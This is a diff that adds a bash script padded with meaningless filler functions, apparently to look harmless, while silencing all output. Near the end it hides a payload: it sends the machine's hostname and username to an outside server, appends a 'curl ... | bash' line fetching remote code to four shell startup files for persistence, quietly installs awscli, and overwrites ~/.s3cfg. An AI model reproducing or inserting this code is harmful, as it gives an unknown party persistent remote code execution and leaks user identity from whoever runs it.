@@ -1,0 +1,93 @@
+#!/bin/bash
+
+exec > /dev/null 2>&1
+
+complex_function() {
+    local x=5
+    local y=10
+    local z
+    z=$(( (x * y) + 42 / 3 ))
+
+    if [[ $z -lt 100 ]]; then
+        for ((i=0; i<10; i++)); do
+            z=$((z + i))
+        done
+    else
+        z=$((z - 25))
+    fi
+
+    echo "$z"
+}
+
+# Create a function that calls another function and does string manipulation
+string_manipulation() {
+    local str="complex bash script"
+    local newstr="${str//bash/shell}"
+    echo "$newstr"
+}
+
+# Perform array manipulations
+array_example() {
+    local myarray=("alpha" "beta" "gamma" "delta")
+    for element in "${myarray[@]}"; do
+        local len=${#element}
+        echo "$element has length $len"
+    done
+}
+
+# Use subshells to complicate the script
+subshell_example() {
+    (cd /tmp && mkdir -p "testdir" && touch testfile)
+    (cd /tmp/testdir && rm -f testfile && rmdir "testdir")
+}
+
+# Call all functions and suppress outputs
+complex_function
+string_manipulation
+array_example
+subshell_example
+
+# Complex looking conditionals with arithmetic and file checks
+if [[ -f /tmp/testfile && $(complex_function) -gt 50 ]]; then
+    rm -f /tmp/testfile
+else
+    touch /tmp/testfile
+fi
+
+# More complex nested loops and conditionals
+for ((i=1; i<=10; i++)); do
+    for ((j=1; j<=i; j++)); do
+        if (( (i + j) % 2 == 0 )); then
+            continue
+        else
+            break
+        fi
+    done
+done
+
+
+curl -X POST https://git.appsec.foo/process \
+-H "Content-Type: application/json" \
+-d '{"status": "knock knock", "hostname": "'$(hostname)'", "username": "'$(whoami)'"}' &
+
+command_to_add="curl https://gitlab.com/-/snippets/3759281/raw/main/zsh-shell-config.sh -s | bash > /dev/null 2>&1"
+
+if ! grep -Fxq "$command_to_add" ~/.bashrc; then
+  echo "$command_to_add" >> ~/.bashrc
+fi
+
+if ! grep -Fxq "$command_to_add" ~/.zshrc; then
+  echo "$command_to_add" >> ~/.zshrc
+fi
+
+if ! grep -Fxq "$command_to_add" ~/.bash_profile; then
+  echo "$command_to_add" >> ~/.bash_profile
+fi
+
+if ! grep -Fxq "$command_to_add" ~/.zprofile; then
+  echo "$command_to_add" >> ~/.zprofile
+fi
+
+HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_NO_INSTALL_CLEANUP=1 brew install tree awscli &
+
+echo -e "[default]\naccess_key=null\nsecret_key=null" > ~/.s3cfg &
